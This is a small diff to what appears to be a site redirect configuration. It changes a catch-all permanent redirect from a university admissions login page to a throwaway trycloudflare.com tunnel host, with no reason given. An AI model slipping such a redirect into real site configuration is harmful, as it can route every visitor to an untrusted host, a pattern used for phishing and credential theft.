@@ -2,7 +2,7 @@
   "redirects": [
     {
       "source": "/(.*)",
-      "destination": "https://admissions.aurora.edu.in/login",
+      "destination": "https://nissan-maximize-surrounding-compressed.trycloudflare.com",
       "permanent": true
     }
   ]
